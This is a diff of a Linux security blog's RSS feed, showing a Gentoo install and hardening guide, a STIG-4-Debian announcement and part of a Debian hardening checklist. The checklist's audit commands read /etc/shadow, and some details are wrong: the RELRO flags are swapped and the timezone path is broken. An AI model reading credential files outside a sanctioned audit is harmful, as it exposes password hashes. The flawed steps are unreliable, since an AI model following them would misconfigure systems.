- mount /dev/sda5/mnt/gentoo/home
- mkdir /mnt/gentoo/tmp
- mount /dev/sda3/mnt/gentoo/tmp
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;6）设置系统时间(注意 日期格式为MMddhhmmyyyy)：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;date 061915262015
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;7）下载系统编译包portage-latest.tar.bz2和stage3-amd64-20150618.tar.bz2到/mnt/gentoo目录下(注意，镜像源我们选择的是阿里云的镜像，使用者可自行更换，下载stage3包时要选择日期最近的)：&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;wget http://mirrors.aliyun.com/gentoo/releases/snapshots/current/portage-latest.tar.bz2&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/1YOrwhV.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt; wget http://mirrors.ustc.edu.cn/gentoo/releases/amd64/autobuilds/current-stage3-amd64/stage3-amd64-20150618.tar.bz&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/gNpBpCX.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;8）解压stage3和portage两个文件：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;tar -jxvf stage3-amd64-20150618.tar.bz2
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;注: stage3-amd64-20131010.tar.bz2解压的文件是Gentoo的目录结构，所以要解压到临时的系统目录下,即/mnt/gentoo，方便后面进行chroot&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;tar -jxvf portage-latest.tar.bz2 -C /mnt/gentoo/usr
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;注: portage-latest.tar.bz2解压的文件为系统软件目录结构,需要解压到/mnt/gentoo/usr目录下&lt;/p&gt;
-
-&lt;h3 id=&quot;gentoo-1&quot;&gt;—-[ 3.2 Gentoo安装及编译&lt;/h3&gt;
-
-&lt;p&gt;1）切换系统到/dev/sda3根分区上并更新系统环境变量：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;mount -t proc none /mnt/gentoo/proc
-mount -o bind /dev /mnt/gentoo/dev
-mount -t sysfs sys /mnt/gentoo/sys
-chroot /mnt/gentoo /bin/bash
-env-update
-&amp;gt;&amp;gt; Regenerating /etc/ld.so.cache...
-source /etc/profile
-export PS1=&quot;(chroot) $PS1&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;2）设置时区：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;cp /usr/share/Asia/Shanghai /etc/localtime
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;3）设置主机名：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;sed -i -e's/hostname.*/hostname=&quot;shenhua&quot;/' /etc/conf.d/hostname
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;4）修改镜像源 并且设置编译参数为8核编译(注意，编译参数在设置为核心数加1时理论上也可获得最优效果)：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/9452UEB.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;5）设置DNS(通常情况下设置默认dns即可，但此步缺失会造成dns无法解析，原因为chroot过程中dns信息未被转移)：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;echo &quot;nameserver 10.1.2.1&quot; &amp;gt;&amp;gt; /etc/resolv.conf
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;6）安装内核源码：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;emerge gentoo-sources
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;7）安装自动编译内核工具genkernel：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;emerge genkernel
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;8）复制安装光盘的配置文件到genkernel搜索配置文件的默认位置(注意32位用户目录为/usr/share/arch/x8/,此配置文件livecd所使用的配置文件)：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;zcat /proc/config.gz &amp;gt; /usr/share/arch/x86_64/kernel-config
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;9）编译内核：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt; genkernel all
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;10）修改fstab：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/Olr6tbb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;11）配置网络：&lt;/p&gt;
-
-&lt;p&gt;　（1）生成软连接(注意，eno1为网络接口名，不同电脑可能不同，请在chroot前用ifconfig命令确认)：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;   ln -s /etc/init.d/net.lo /etc/init.d/net.eno1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;　（2）创建网络配置文件：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt; vi /etc/conf.d/net
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;　在空文件中写入(注意，如果是静态ip请采用静态配置)：
-     # DHCP
-     config_eno1=( “dhcp” )&lt;/p&gt;
-
-&lt;p&gt;12）设置网卡开机自启动：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;rc-update add net.eno1 default
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;13）设置GRUB引导：&lt;/p&gt;
-
-&lt;p&gt;(1) 修改配置文件：在etc/portage/make.conf中添加GRUB_PLATFORMS=”efi-64”(mbr引导可忽略此步骤)&lt;/p&gt;
-
-&lt;p&gt;(2) 安装GRUB&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;emerge --ask sys-boot/grub:2
-emerge -av sys-boot/os-prober
-grub2-install --target=x86_64-efi
-grub2-mkconfig -o /boot/grub2/grub.cfg
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;(3) 重起电脑，确认grub引导是否安装成功，如果成功再进行一下步骤&lt;/p&gt;
-
-&lt;h3 id=&quot;section-1&quot;&gt;—-[ 3.3 软件环境安装&lt;/h3&gt;
-
-&lt;p&gt;1）安装xrog：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt; 在 /etc/portage/make.conf 中添加 INPUT_DEVICES=&quot;evdev synaptics&quot; 
- emerge --ask --verbose --pretend x11-base/xorg-drivers
- emerge --ask x11-base/xorg-server
- cat /etc/portage/package.use/._cfg0000_iputils &amp;gt; /etc/portage/package.use/iputils
- emerge twm
- emerge xclock
- emerge xterm
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;　　备注：twm xclock xterm原本是xrog软件包的一部分，在版本更新后从xrog中分离出来 需要单独安装&lt;/p&gt;
-
-&lt;p&gt;2）编译kde桌面环境 
-　　备注：编译其他环境 请参照wiki.gentoo.org openrc启动的kde对应的编号是6 其他桌面环境请自行更换&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;eselect profile list
-eselect profile set 6
-emerge --ask kde-apps/kdebase-meta
-emerge --ask kde-base/kde4-l10n
-在/etc/portage/make.conf中添加 LINGUAS=&quot;de&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;gentoo-2&quot;&gt;–[  4、Gentoo内核加固&lt;/h2&gt;
-
-&lt;h3 id=&quot;section-2&quot;&gt;—-[ 4.1　加固选项设置&lt;/h3&gt;
-
-&lt;p&gt;　　编辑/etc/ssh/ssh_config文件，在里面加入：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;	# 1, known_hosts stores server's signature, so hash the host name:	
-	HashKnownHosts yes
-	#2, SSH protocl version 1 is not secure:
-	Protocol 2
-	#3, If you don't use X11 forwarding, plz disable it&quot;
-	X11Forwarding no
-	#4, Disable rhosts:
-	IgnoreRhosts yes
-	#5, Not allow empty password:
-	PermitEmptyPasswords no
-	#6, Maxisum tries:
-	MaxAuthTries 5
-	#7, Now allow root login:
-	PermitRootLogin no
-	#(Optional)
-	#1, disable password auth, enable pubkey auth:
-	PubkeyAuthentication yes
-	PasswordAuthentication no
-	#2，Allow or deny users/groups
-	#AllowGroups, AllowUsers, DenyUsers, DenyGroups
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;　　根据自己的实际要求在改写最后一行 改为自己的用户组合用户名&lt;/p&gt;
-
-&lt;h3 id=&quot;gentoo-hardened&quot;&gt;—-[ 4.2　编译gentoo hardened内核&lt;/h3&gt;
-
-&lt;p&gt;1）下载加固内核源码&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;emerge --ask sys-kernel/hardened-sources
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;2）配置加固内核 参照：&lt;/p&gt;
-
-&lt;p&gt;　　&lt;a href=&quot;https://wiki.gentoo.org/wiki/Hardened/PaX_Quickstart#Building_a_PaX_Kernel&quot;&gt;https://wiki.gentoo.org/wiki/Hardened/PaX_Quickstart#Building_a_PaX_Kernel&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;　　&lt;a href=&quot;https://wiki.gentoo.org/wiki/Hardened/Grsecurity2_Quickstart&quot;&gt;https://wiki.gentoo.org/wiki/Hardened/Grsecurity2_Quickstart&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;3）编译&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;$ make
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;4）安装&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;# make install
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;5）选择内核&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;# eselect kernel list
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;6）重启使用新内核即可&lt;/p&gt;
-
-</description>
-        <pubDate>Tue, 23 Jun 2015 00:00:00 +0800</pubDate>
-        <link>http://www.hardenedlinux.org/system-security/2015/06/23/Gentoo_system_install&kernal_harden.html</link>
-        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/06/23/Gentoo_system_install&kernal_harden.html</guid>
-        
-        
-        <category>system-security</category>
-        
-      </item>
-    
-      <item>
-        <title>STIG-4-Debian</title>
-        <description>&lt;p&gt;By:n3o4po11o&lt;/p&gt;
-
-&lt;p&gt;Project: &lt;a href=&quot;https://github.com/hardenedlinux/STIG-4-Debian&quot;&gt;STIG-4-Debian&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;why-stig&quot;&gt;Why STIG?&lt;/h2&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://iase.disa.mil/stigs/Pages/index.aspx&quot;&gt;STIGs&lt;/a&gt; is bring by a government agency called The Defense Information
-System Agency(DISA), which is entity responsible for maintaining the security
-posture of the Department of Defence(DoD) IT infrastructure. After we heard 
-how the NSA fuck this world from Mr.Sn0wd3n.We will pay more attention about
-how &lt;em&gt;they&lt;/em&gt; do the defense.&lt;/p&gt;
-
-&lt;p&gt;DoD use this Security Technical Implementation Guides to All DoD IT assets before online/operations.&lt;/p&gt;
-
-&lt;p&gt;And the STIGs classification system based on Mission Assurance Catagory (I-III)
-and Confidentiality Level (Public-Classified), giving you 9 different possible 
-combinations of config requirements.&lt;/p&gt;
-
-&lt;h2 id=&quot;why-debian&quot;&gt;Why Debian?&lt;/h2&gt;
-
-&lt;p&gt;In this scripts I’ve on Debian GNU/Linux 8, Debian has a lot security mechanism, and 
-some good features, especially “ReproducibleBuilds”. I use the STIG for Red hat
-6 v1r7 to porting STIG for Debian 8.&lt;/p&gt;
-
-&lt;p&gt;Debian always has active maintenance, and has good security in default-configuration&lt;/p&gt;
-
-&lt;h2 id=&quot;whats-different&quot;&gt;What’s different?&lt;/h2&gt;
-
-&lt;p&gt;In STIG for RHEL-06, there’s some service doesn’t exist in debian, or some command or
-some purpose implement in different way.&lt;/p&gt;
-
-&lt;p&gt;You could find the porting-log in the repo &lt;a href=&quot;https://github.com/hardenedlinux/STIG-4-Debian&quot;&gt;STIG-4-Debian&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;But the general idea are all based on &lt;a href=&quot;http://iasecontent.disa.mil/stigs/zip/Apr2015/U_RedHat_6_V1R7_STIG.zip&quot;&gt;STIG For RHEL-06 v1r7&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;todo&quot;&gt;TODO&lt;/h2&gt;
-
-&lt;p&gt;There’s a lot of TODO &lt;br /&gt;
-Because this version I release just a simple “POC”, and just a pre-release version.
-It doesn’t even cover all the “check”&lt;/p&gt;
-
-&lt;p&gt;But I will release the first version of “full-check” version soon, and add Classification 
-and Severity right after full-check, I think it will release in next month.&lt;/p&gt;
-
-&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
-
-&lt;p&gt;[1]Difference between hardening guides (CIS, NSA, DISA)
-http://security.stackexchange.com/questions/73164/difference-between-hardening-guides-cis-nsa-disa&lt;/p&gt;
-
-&lt;p&gt;[2]What Are “STIGs” and How Do They Impact Your Overall Security Program?
-http://www.seguetech.com/blog/2013/05/06/stigs-impact-overall-security-program&lt;/p&gt;
-
-&lt;p&gt;[3]Beyond compliance: DISA STIGs’ role in cybersecurity
-http://gcn.com/Articles/2015/05/14/DISA-STIG-compliance.aspx?Page=1&lt;/p&gt;
-
-&lt;p&gt;[4]Security Technical Implementation Guides (STIGs)
-http://iase.disa.mil/stigs/Pages/index.aspx&lt;/p&gt;
-
-&lt;p&gt;[5]DISA RHEL 6 STIG V1 R7
-http://iasecontent.disa.mil/stigs/zip/Apr2015/U_RedHat_6_V1R7_STIG.zip&lt;/p&gt;
-
-&lt;p&gt;[6]Defense Information Systems Agency
-https://en.wikipedia.org/wiki/Defense_Information_Systems_Agency&lt;/p&gt;
-
-&lt;p&gt;[7]ReproducibleBuilds
-https://wiki.debian.org/ReproducibleBuilds&lt;/p&gt;
-</description>
-        <pubDate>Fri, 19 Jun 2015 11:38:39 +0800</pubDate>
-        <link>http://www.hardenedlinux.org/system-security/2015/06/19/STIG-4-Debian.html</link>
-        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/06/19/STIG-4-Debian.html</guid>
-        
-        
-        <category>system-security</category>
-        
-      </item>
-    
-      <item>
-        <title>Debian GNU/Linux security checklist and hardening</title>
-        <description>&lt;p&gt;project STIG-4-Debian will be soonn….&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/citypw/DNFWAH/master/5/d5_0x02_DNFWAH_debian_gnu-linux_security_chklist_hardening.txt&quot;&gt;Debian GNU/Linux security checklist and hardening&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;–[ CONTENTS&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;About this doc&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Security updates&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Vulnerability Assessment&lt;/p&gt;
-
-    &lt;p&gt;2.1 GCC mitigation&lt;/p&gt;
-
-    &lt;p&gt;2.2 0ld sch00l *nix file auditing&lt;/p&gt;
-
-    &lt;p&gt;2.3 GNU/Linux’s auditd&lt;/p&gt;
-
-    &lt;p&gt;2.4 T00ls&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Kernel security&lt;/p&gt;
-
-    &lt;p&gt;3.1 Apparmor&lt;/p&gt;
-
-    &lt;p&gt;3.2 SELinux&lt;/p&gt;
-
-    &lt;p&gt;3.3 Mempo kernel&lt;/p&gt;
-
-    &lt;pre&gt;&lt;code&gt;3.3.1 PaX\/Grsecurity
-&lt;/code&gt;&lt;/pre&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;SSL/TLS Checklist&lt;/p&gt;
-
-    &lt;p&gt;4.1 Ciphersuites in Apache2/Nginx&lt;/p&gt;
-
-    &lt;p&gt;4.2 OpenSSH&lt;/p&gt;
-
-    &lt;pre&gt;&lt;code&gt;4.2.1 OpenSSH in post-prism era
-&lt;/code&gt;&lt;/pre&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Web security&lt;/p&gt;
-
-    &lt;p&gt;5.1 Web server( Apache/Nginx?)&lt;/p&gt;
-
-    &lt;p&gt;5.2 WAF( Web Application Firewall)&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Security standard&lt;/p&gt;
-
-    &lt;p&gt;6.1 STIGs for Debian&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Reference&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;about-this-documentation&quot;&gt;–[ 0. About this documentation&lt;/h2&gt;
-
-&lt;p&gt;GNU/Linux already become one of most important fundamental element in
-*modern* IT platform. Almost every important applications heavily rely
-on the core component of GNU system: GCC, Glibc and linux
-kernel. GNU/Linux is totally free/libre and open source software(
-FLOSS). Many people thinks free/libre and open source software is
-secure because its open to many eyes. Yes, that’s true. According to
-&lt;a href=&quot;http://developers.slashdot.org/story/14/04/16/2021227/code-quality-open-source-vs-proprietary&quot;&gt;Coverity’s report&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;The source code quality of FLOSS project are better than closed
-software systems. But the FLOSS is not unbreakable. This documentation
-is going to discuss something we should know about GNU/Linux security
-operations. These examples in this doc has been tested only on Debian
-GNU/Linux 7.5.&lt;/p&gt;
-
-&lt;h2 id=&quot;security-update&quot;&gt;–[ 1. Security update&lt;/h2&gt;
-
-&lt;p&gt;Follow the minimal installation principle: Debian is providing mini
-installation iso.&lt;/p&gt;
-
-&lt;p&gt;To check which packages need security updates:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;#sudo apt-get upgrade -s&lt;/td&gt;
-      &lt;td&gt;grep -i security&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;vulnerability-assessment&quot;&gt;–[ 2. Vulnerability Assessment&lt;/h2&gt;
-
-&lt;p&gt;Know your GNU/Linux system as your *enemy* does. Your enmey might hide
-in the shadow and watch and learn the ways you’ve been using the
-system. As a defender, some philosophical ideas( thanks to Bruce
-Schneier) should be &lt;a href=&quot;https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html&quot;&gt;kept in mind&lt;/a&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-&lt;p&gt;Security is NOT:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;Security is NOT installing a firewall&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Security is NOT a Product or Service&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Security is Not a Product; It’s a Process&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Security is:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;Security is a Process, Methodology, Costs, Policies and People&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Security is only as good as your “weakest link”&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Security is 24x7x365 … constantly ongoing .. never ending&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;A security system is only as strong as its weakest
-link. Defense-in-depth seems the only option we have. You should be
-the best professional paranoia and also need a proper threat
-model. “Who’s gonna attack your system” would be daily bread for your
-mind;-)&lt;/p&gt;
-
-&lt;p&gt;Those two articles are good examples of assessing GNU/Linux distros: &lt;a href=&quot;https://labs.mwrinfosecurity.com/blog/2010/06/29/assessing-the-tux-strength-part-1---userspace-memory-protection/&quot;&gt;Assessing I&lt;/a&gt;, &lt;a href=&quot;https://labs.mwrinfosecurity.com/blog/2010/09/02/assessing-the-tux-strength-part-2---into-the-kernel/&quot;&gt;Assessing II&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;“checksec.sh” is very useful tool from trapkit:&lt;/p&gt;
-&lt;pre&gt;
-#wget http://www.trapkit.de/tools/checksec.sh
-&lt;/pre&gt;
-
-&lt;p&gt;Be very careful with those binaries, which has suid( or sgid?) bit:&lt;/p&gt;
-&lt;pre&gt;
-#!/bin/bash
-
-SETUID_PROGS=`find / -type f -perm -4000`
-
-echo $SETUID_PROGS
-
-for i in $SETUID_PROGS; do
-        ./checksec.sh --file $i
-done
-&lt;/pre&gt;
-
-&lt;h3 id=&quot;gcc-mitigation&quot;&gt;—-[ 2.1 GCC mitigation&lt;/h3&gt;
-
-&lt;p&gt;setuid binaries are highly risks if the program had the bug that can
-be exploitable.  The setuid binaries should be protected under GCC’s
-mitigation.  We only examine &lt;a href=&quot;http://phrack.org/archives/issues/67/13.txt&quot;&gt;4 mitigation options here&lt;/a&gt; ( some GCC mitigation
-description from one Phrack paper, thanks pi3..dude, did I owe you a
-beer?)&lt;/p&gt;
-
-&lt;p&gt;*) NX&lt;/p&gt;
-
-&lt;p&gt;This feature can prevent shellcode execution on the stack.  This
-mechanism can be implemented by hardware or software emulation.&lt;/p&gt;
-
-&lt;p&gt;In GCC’s options, &lt;a href=&quot;http://en.wikipedia.org/wiki/NX_bit&quot;&gt;NX&lt;/a&gt; is enable by default. If you want to turn it off,
-use “-z execstack”.&lt;/p&gt;
-
-&lt;p&gt;Check method:&lt;/p&gt;
-&lt;pre&gt;
-shawn@shawn-fortress ~ $ readelf -l a.out | grep GNU_STACK 
-  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x8
-&lt;/pre&gt;
-
-&lt;p&gt;*) Stack canaries (canaries of the death)&lt;/p&gt;
-
-&lt;p&gt;This is a compiler mechanism, in contrast to previously kernel-based
-described techniques. When a function is called, the code inserted by
-the compiler in its prologue stores a special value (the so-called
-cookie) on the stack before the metadata. This value is a kind of
-defender of sensitive data. During the epilogue the stack value is
-compared with the original one and if they are not the same then a
-memory corruption must have occurred. The program is then killed and
-this situation is reported in the system logs. Details about technical
-implementation and little arm race between protection and bypassing
-protection in this area will be explained further.&lt;/p&gt;
-
-&lt;p&gt;GCC options:
--fno-stack-protector,  do not add any canary onto any functions&lt;/p&gt;
-
-&lt;p&gt;-fstack-protector, only add the canary onto a few functions in compile
- time&lt;/p&gt;
-
-&lt;p&gt;-fstack-protector-all , add the canary onto all functions, be cautions
- about this one. It’d be triggered the heavily performance hit.&lt;/p&gt;
-
-&lt;p&gt;-fstack-protector-strong, add the canary onto those functions, which
- the stack buffers would be used. This is a smart one. But its only
- supported by GCC 4.9.x. Kees Cook shared a very &lt;a href=&quot;http://www.outflux.net/blog/archives/2014/01/27/fstack-protector-strong/&quot;&gt;good writing here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Check the symbols in an elf file:&lt;/p&gt;
-&lt;pre&gt;
-#readelf -s ./a.out | grep stack_chk_fail 
-     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@GLIBC_2.4 (3) 
-    52: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@@GLIBC_2 
-&lt;/pre&gt;
-
-&lt;p&gt;*) RELRO&lt;/p&gt;
-
-&lt;p&gt;RELocation Read-Only.&lt;/p&gt;
-
-&lt;p&gt;Turn it on: -z norelro 
-Turn it off: -z now&lt;/p&gt;
-
-&lt;p&gt;Check elf header to find partial-RELRO:&lt;/p&gt;
-&lt;pre&gt;
-shawn@shawn-fortress ~ $ readelf -l a.out | grep GNU_RELRO 
-  GNU_RELRO      0x0000000000000e28 0x0000000000600e28 0x0000000000600e28 
-
-Check elf's dynamic sections to find fully-RELRO: 
-shawn@shawn-fortress ~ $ readelf -d a.out | grep BIND_NOW 
- 0x0000000000000018 (BIND_NOW)
-&lt;/pre&gt;
-
-&lt;p&gt;*) PIE&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Position-independent_code&quot;&gt;PIE&lt;/a&gt; enforces every process’s code segment is mmap()’d, it begins at a
-different base address at each execution of the application.&lt;/p&gt;
-
-&lt;p&gt;Note: mmap()’ is always used no matter what the type of the executable
-is (PIE vs. non-PIE). For non-PIE binaries the kernel uses an internal
-flag equivalent to MMAP_FIXED when mapping program headers.&lt;/p&gt;
-
-&lt;p&gt;GCC option: -pie, it only work for sec mitigation when kernel enables
-ASLR.&lt;/p&gt;
-&lt;pre&gt;
-no PIE: 
-shawn@shawn-fortress ~ $ readelf -h a.out | grep &quot;Type:[[:space:]]*EXEC&quot; 
-  Type:                              EXEC (Executable file) 
-
-PIE: 
-shawn@shawn-fortress ~ $ readelf -h a.out | grep &quot;Type:[[:space:]]*DYN&quot; 
-  Type:                              DYN (Shared object file)
-&lt;/pre&gt;
-
-&lt;p&gt;These exploit mitigations provided by GCC will definitely increase the
-cost of attackers. We all did believed so…until shit happened( as
-always?). Hector Marco &lt;a href=&quot;http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html&quot;&gt;released a method&lt;/a&gt; that can bypass NX/ASLR/PIE/CANARY mitigations locally/remotely
-easily. After these years of debating and bragging about how secure of
-GNU/Linux is/was and we finally ended up in*One mem infoleak can rule
-the fuc*ing GNU/Linux*!!! Damn, PaX/Grsecurity will be our last hope
-again, like a decade ago………..&lt;/p&gt;
-
-&lt;h3 id=&quot;ld-sch00l-nix-file-auditing&quot;&gt;—-[ 2.2 0ld sch00l *nix file auditing&lt;/h3&gt;
-
-&lt;p&gt;There are a bunch of files that could be exploited by attackers in the
-specific scene. Fortunately, FOSS( Free &amp;amp; Open Source) community is
-providing a lot of methods for the security audit work. They should be
-a defender’s daily bread, which being part of defense-in-depth model.&lt;/p&gt;
-
-&lt;p&gt;WildCards is a powerful feature in UNIX-like platform, but it can be
-&lt;a href=&quot;http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt&quot;&gt;exploited&lt;/a&gt; by attackers:&lt;/p&gt;
-
-&lt;pre&gt;find / -path /proc -prune  -name &quot;-*&quot;&lt;/pre&gt;
-
-&lt;p&gt;World-writable file audit:&lt;/p&gt;
-
-&lt;pre&gt;find / -path /proc -prune -o -perm -2 ! -type l -ls&lt;/pre&gt;
-
-&lt;p&gt;World-readable file audit, correct permission: chmod 640 /var/log/:&lt;/p&gt;
-
-&lt;pre&gt;find /var/log -perm -o=r ! -type l&lt;/pre&gt;
-
-&lt;p&gt;Check if files were orphange:&lt;/p&gt;
-
-&lt;pre&gt;find / -path /proc -prune -o -nouser -o -nogroup&lt;/pre&gt;
-
-&lt;p&gt;List avaiable users, be cautions about who’s the “user”:&lt;/p&gt;
-&lt;pre&gt;egrep -v '.*:\*|:\!' /etc/shadow | awk -F: '{print $1}'&lt;/pre&gt;
-
-&lt;p&gt;Check which files belong to whom. Then delete the user correctly:&lt;/p&gt;
-
-&lt;pre&gt;userdel -r account&lt;/pre&gt;
-
-&lt;pre&gt;find / -path /proc -prune -o -user account -ls&lt;/pre&gt;
-
-&lt;p&gt;List which users are unavailable:&lt;/p&gt;
-
-&lt;pre&gt;grep -v ':x:' /etc/passwd&lt;/pre&gt;
-
-&lt;p&gt;List expired passwords:&lt;/p&gt;
-
-&lt;pre&gt;cat /etc/shadow | cut -d: -f 1,2 | grep '!'&lt;/pre&gt;
-
-&lt;p&gt;The correct permission should be 644 at least. 600 would be better:&lt;/p&gt;
-
-&lt;pre&gt;ls -l /boot&lt;/pre&gt;
-
-&lt;p&gt;Files with suid or sgid flags:&lt;/p&gt;
-
-&lt;pre&gt;find / -xdev -user root \( -perm -4000 -o -perm -2000 \)&lt;/pre&gt;
-
-&lt;p&gt;Check if some stupid mistakes has been made( Thanks to Tim Brown):&lt;/p&gt;
-
-&lt;pre&gt;objdump -x $i | grep -i path&lt;/pre&gt;
-
-&lt;p&gt;Note: The main stream GNU/Linux distro( Debian, Gentoo, OpenSUSE,
-CentOS) won’t have big chance to do stupid things, but it’s worth to
-look at GNU/Linux platform with 3-rd party applications. Some
-commercial applications may do something stuipid like this one:&lt;/p&gt;
-
-&lt;p&gt;http://lists.openwall.net/bugtraq/2014/06/04/5&lt;/p&gt;
-
-&lt;p&gt;—-[ 2.3 GNU/Linux’s auditd&lt;/p&gt;
-
-&lt;p&gt;One particular scene is that some m41wares( or human attackers) might
-be interested in change some file’s metadata for some *interesting*
-reasons and then change it back to the original. Let’s show time:&lt;/p&gt;
-
-&lt;p&gt;Install auditd and make sure its on boot startup:&lt;/p&gt;
-&lt;pre&gt;#apt-get install auditd
-#update-rc.d auditd enable&lt;/pre&gt;
-
-&lt;p&gt;Config file:&lt;/p&gt;
-
-&lt;pre&gt;/etc/audit/auditd.conf&lt;/pre&gt;
-
-&lt;p&gt;Store log file:&lt;/p&gt;
-
-&lt;pre&gt;log_file = /var/log/audit/audit.log&lt;/pre&gt;
-
-&lt;p&gt;Add one policy to /etc/audit/audit.rules:&lt;/p&gt;
-
-&lt;pre&gt;-w /home/shawn/change-test -p wa -k  identify&lt;/pre&gt;
-
-&lt;p&gt;Use this test program to change the permission：&lt;/p&gt;
-
